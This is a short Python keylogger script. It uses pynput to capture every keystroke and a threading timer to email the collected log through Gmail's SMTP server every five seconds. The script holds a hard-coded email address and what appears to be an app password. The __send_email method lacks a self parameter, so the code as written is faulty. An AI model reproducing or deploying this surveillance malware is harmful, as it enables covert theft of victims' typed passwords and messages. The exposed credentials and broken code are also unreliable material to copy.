import pynput.keyboard as pk    
import threading,smtplib

class KeyLogger:
    def __init__(self,time_interval,email,password):
        self.log = ''
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def __key_check_proccess(self,key:pk.KeyCode):
        if key == pk.Key.space :
            self.log += ' '
        else :
            try :
                self.log += key.char
            except:
                self.log += f' {key.name} '

    def __report(self):
        self.__send_email(self.email,self.password,self.log)
        self.log = ''
        timer = threading.Timer(self.time_interval,self.__report)
        timer.start()

    def __send_email(email,password,message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def start(self):
        KeyListener = pk.Listener(on_press=self.__key_check_proccess)
        with KeyListener:
            self.__report()
            KeyListener.join()


keylogger = KeyLogger(5,"naghinjadali@gmail.com",'dkruuqpidwiaxjdh')
keylogger.start()